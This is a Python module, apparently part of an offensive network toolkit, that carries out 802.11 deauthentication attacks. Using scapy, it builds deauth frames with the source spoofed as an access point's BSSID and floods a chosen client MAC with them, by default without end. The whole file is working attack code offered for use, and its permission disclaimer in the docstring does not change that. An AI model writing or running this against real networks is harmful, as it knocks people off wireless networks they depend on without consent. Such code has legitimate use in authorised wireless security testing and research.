"""
Author: Chris Martinez
Date: 20 June 2026
Version: 1.0.0
Name: __init__.py (deauth)
Description: This module performs 802.11 deauthentication attacks against
wireless clients by sending forged deauth frames over the air. It spoofs
the source address as the target access point's BSSID, causing the
client to disconnect since 802.11 management frames are unauthenticated
by default. Supports a continuous flood loop with configurable count and
interval. Requires the interface to already be in monitor mode. Has no
effect against networks protected by 802.11w (PMF), such as WPA3.
Should only be used against networks you own or have explicit written
permission to test.
"""
import argparse
import itertools
import macaddress
import signal
import time

from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from types import FrameType

from netlink.core.base_module import BaseModule
from netlink.core.output import OutputManager

class Deauth(BaseModule):
    """
    The Deauth class performs 802.11 deauthentication attacks by crafting
    and sending forged deauth management frames to a target client. The
    frame's source address is spoofed as the access point's BSSID so the
    client believes the disconnect request is legitimate. Sends frames in
    a continuous loop following the same count/interval flood pattern used
    by SynFlood, and reports the total number of frames sent on exit.
    Monitor mode must be enabled on the interface before running this
    module, and the attack has no effect against clients connected to a
    network with 802.11w (PMF) enabled.
    """
    ############################################################################
    # Class Level Attributes
    ############################################################################
    NAME = 'deauth'
    DESCRIPTION = "802.11 deauthentication attack"
    REQUIRES_ROOT = True

    ############################################################################
    # Constructor
    ############################################################################
    def __init__(self, iface: str, output: OutputManager):
        super().__init__(iface, output)
        self._keyboard_interrupted = False
        self._packets_sent = 0

    ############################################################################
    # Abstract Required Methods
    ############################################################################
    def add_args(self, parser: argparse.ArgumentParser) -> None:
        """
        Adds module-specific arguments to the argument parser. This method is
        called by the Engine when setting up the CLI for this module. Defines
        arguments for packet count, interval between packets, the target
        client's MAC address, and the access point's BSSID to spoof as the
        source address.
        Args:
            parser (argparse.ArgumentParser): The argument parser to which
                                            module-specific args are added.
        """
        parser.description = (
            "Perform an 802.11 deauthentication attack by sending forged "
            "deauth frames to a target client, spoofing the source address as "
            "the access point's BSSID. The target client will disconnect from "
            "the network upon receiving the frame. Requires monitor mode to be "
            "enabled on the interface beforehand. Ineffective against networks "
            "with 802.11w (PMF) enabled, such as WPA3."
        )

        parser.add_argument(
            '-c',
            '--count',
            type=int,
            action='store',
            dest='count',
            default=0,
            help="Number of packets to send (Default=0 infinite)"
        )

        parser.add_argument(
            '--interval',
            type=float,
            action='store',
            dest='interval',
            default=0.0,
            help="The interval of N seconds between packets sent (Dafault=0)"
        )

        parser.add_argument(
            '-t',
            '--target',
            type=str,
            action='store',
            dest='target',
            required=True,
            help="The MAC of the target to Deauth"
        )

        parser.add_argument(
            '-b',
            '--bssid',
            type=str,
            action='store',
            dest='bssid',
            required=True,
            help=(
                "The bssid of the acccess point to spoof as for Deauth "
                "[Format: 'xx:xx:xx']"
            )
        )

    def run(self, args: argparse.Namespace) -> None:
        """
        Executes the main functionality of the Deauth module. Registers the
        SIGINT signal handler for graceful Ctrl+C exit and sets up the packet
        counter as either a finite range or infinite iterator depending on the
        count argument. Constructs a single deauth frame with the source
        address spoofed as the access point's BSSID and sends it repeatedly
        via sendp() at the specified interval. Prints the total number of
        frames sent on exit regardless of how the loop ends.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                    specific to the Deauth module.
        """
        MANAGEMENT = 0
        DEAUTHENTICATION = 12
        CLASS_3_FRAME = 7

        signal.signal(signal.SIGINT, self._sigint_handler)
        counter = range(args.count) if args.count > 0 else itertools.count()

        dot11_layer = Dot11(type=MANAGEMENT, 
                            subtype=DEAUTHENTICATION, 
                            addr1=args.target, 
                            addr2=args.bssid, 
                            addr3=args.bssid
                            )
        deauth_layer = Dot11Deauth(reason=CLASS_3_FRAME)
        pkt = RadioTap()/dot11_layer/deauth_layer

        try:
            self.output.info(f"Attempting to Deauth {args.target}")
            for _ in counter:
                if self._keyboard_interrupted:
                    self.output.warn("Keyboard interrupted (CTRL+C)")
                    break
                sendp(pkt, iface=self.iface)
                self._packets_sent += 1
                time.sleep(args.interval)
        except Exception as e:
            self.output.error(f"{e}")
        finally:
            signal.signal(signal.SIGINT, signal.SIG_DFL)
            self.output.info(f"Packets sent: {self._packets_sent}")

    ############################################################################
    # Methods
    ############################################################################
    def validate_args(self, args: argparse.Namespace) -> bool:
        """
        Validates the provided arguments for the Deauth module. Checks that
        target and bssid are valid MAC addresses, that they are not the same
        address, and that count and interval are not negative.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                    specific to the Deauth module.
        Returns:
            bool: True if all arguments are valid, False otherwise.
        """
        try:
            macaddress.MAC(args.target)
        except ValueError:
            self.output.error("Invalid MAC address for the target")
            return False
        
        try:
            macaddress.MAC(args.bssid)
        except ValueError:
            self.output.error("Invalid MAC address for the BSSID")
            return False
        
        if args.target == args.bssid:
            msg = "Target and BSSID MAC addresses cannot be the same"
            self.output.warn(msg)
            return False
        
        if args.count < 0:
            self.output.error("Count must be 0 or greater")
            return False
        
        if args.interval < 0:
            self.output.error("Interval must be 0 or greater")
            return False

        return True
    
    def _sigint_handler(self, sig: int, frame: FrameType|None) -> None:
        """
        Handles the SIGINT signal generated by Ctrl+C by setting the
        keyboard_interrupted flag to True. Allows the flood loop to exit
        cleanly after the current frame is sent rather than terminating
        abruptly mid-send.
        Args:
            sig (int): The signal number received. Will be signal.SIGINT
                    when triggered by Ctrl+C.
            frame (FrameType | None): The current stack frame at the time
                                    the signal was received. Not used but
                                    required by the signal handler interface.
        """
        self._keyboard_interrupted = True
